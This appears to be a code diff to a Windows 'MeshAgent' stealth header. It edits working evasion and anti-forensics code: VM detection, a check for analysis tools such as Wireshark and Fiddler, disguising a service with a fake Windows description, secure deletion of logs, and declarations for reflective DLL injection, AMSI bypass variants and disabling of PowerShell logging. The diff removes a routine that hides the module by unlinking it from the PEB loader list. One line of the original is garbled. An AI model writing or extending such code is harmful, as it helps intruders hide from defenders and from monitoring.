@@ -19,6 +19,7 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <psapi.h>
+#include <stdio.h>
 
 // Avoid pulling in winternl/ntdll by default to reduce surface area and
 // accidental reliance on unstable/undocumented structures. Only include when
@@ -53,26 +54,7 @@ public:
     }
 
     // Hide process from task managers via undocumented internals (disabled by default)
-    static BOOL HideFromTaskManager() {
-#ifdef MESHAGENT_ENABLE_STEALTH
-        #ifdef _WIN64
-        PPEB peb = (PPEB)__readgsqword(0x60);
-        #else
-        PPEB peb = (PPEB)__readfsdword(0x30);
-        #endif
-        if (peb && peb->Ldr) {
-            PLIST_ENTRY current = peb->Ldr->InLoadOrderModuleList.Flink;
-            if (current && current->Flink) {
-                current->Blink->Flink = current->Flink;
-                current->Flink->Blink = current->Blink;
-                return TRUE;
-            }
-        }
-        return FALSE;
-#else
-        return FALSE; // disabled
-#endif
-    }
+    static BOOL HideFromTaskManager() { return FALSE; }
 };
 
 // Network connection obfuscation
@@ -106,12 +88,12 @@ public:
 
         // Check 3: Known VM vendors in hardware (heuristic)
         HKEY hKey;
-        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                         L"HARDWARE\\DESCRIPTION\\System\\BIOS",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             WCHAR vendor[256] = {0};
             DWORD size = sizeof(vendor);
-            if (RegQueryValueEx(hKey, L"SystemManufacturer", NULL, NULL,
+            if (RegQueryValueExW(hKey, L"SystemManufacturer", NULL, NULL,
                                (LPBYTE)vendor, &size) == ERROR_SUCCESS) {
                 if (wcsstr(vendor, L"VMware") || wcsstr(vendor, L"VirtualBox") ||
                     wcsstr(vendor, L"QEMU") || wcsstr(vendor, L"Xen")) {
@@ -176,11 +158,11 @@ public:
     // Hide service from services.msc by modifying description
     static BOOL BlendWithSystemServices(SC_HANDLE hService) {
         // Use generic Windows service description
-        const system health monitoring
+        static const wchar_t* description =
             L"Provides diagnostic data collection and system health monitoring. "
             L"If this service is stopped, certain features may not function properly.";
 
-        SERVICE_DESCRIPTION sd;
+        SERVICE_DESCRIPTIONW sd;
         sd.lpDescription = (LPWSTR)description;
 
         return ChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
@@ -211,8 +193,8 @@ public:
 
     // Securely delete log file (DOD 5220.22-M standard)
     static BOOL SecureDelete(const wchar_t* filePath) {
-        HANDLE hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL,
-                                   OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL,
+                                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile == INVALID_HANDLE_VALUE) return FALSE;
 
         LARGE_INTEGER fileSize;
@@ -254,7 +236,7 @@ public:
         CloseHandle(hFile);
 
         // Finally delete the file
-        return DeleteFile(filePath);
+        return DeleteFileW(filePath);
     }
 };
 
@@ -270,11 +252,11 @@ private:
     static LONG WINAPI CrashHandler(EXCEPTION_POINTERS* exceptionInfo) {
         // Log crash information (encrypted)
         WCHAR crashLog[MAX_PATH];
-        GetModuleFileName(NULL, crashLog, MAX_PATH);
+        GetModuleFileNameW(NULL, crashLog, MAX_PATH);
         wcscat_s(crashLog, L".crash");
 
-        HANDLE hFile = CreateFile(crashLog, GENERIC_WRITE, 0, NULL,
-                                   CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+        HANDLE hFile = CreateFileW(crashLog, GENERIC_WRITE, 0, NULL,
+                                    CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
             char crashData[512];
             sprintf_s(crashData, "Exception: 0x%08X at 0x%p\r\n",
@@ -326,10 +308,10 @@ public:
         HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
 
-        PROCESSENTRY32 pe32;
-        pe32.dwSize = sizeof(PROCESSENTRY32);
+        PROCESSENTRY32W pe32;
+        pe32.dwSize = sizeof(PROCESSENTRY32W);
 
-        if (Process32First(hSnapshot, &pe32)) {
+        if (Process32FirstW(hSnapshot, &pe32)) {
             do {
                 if (_wcsicmp(pe32.szExeFile, L"Wireshark.exe") == 0 ||
                     _wcsicmp(pe32.szExeFile, L"Fiddler.exe") == 0 ||
@@ -337,7 +319,7 @@ public:
                     CloseHandle(hSnapshot);
                     return TRUE;
                 }
-            } while (Process32Next(hSnapshot, &pe32));
+            } while (Process32NextW(hSnapshot, &pe32));
         }
 
         CloseHandle(hSnapshot);
@@ -426,6 +408,9 @@ BOOL Stealth_ReflectiveInject(DWORD processId, const BYTE* dllBytes, size_t dllS
  * Patch AMSI (Antimalware Scan Interface) to bypass script scanning
  */
 BOOL Stealth_PatchAMSI(void);
+// Optional AMSI bypass variants (lab/testing): hardware breakpoint & NtContinue
+BOOL Stealth_PatchAMSI_HardwareBreakpoint(void);
+BOOL Stealth_PatchAMSI_NtContinue(void);
 
 /**
  * Disable PowerShell and Command Line event logging
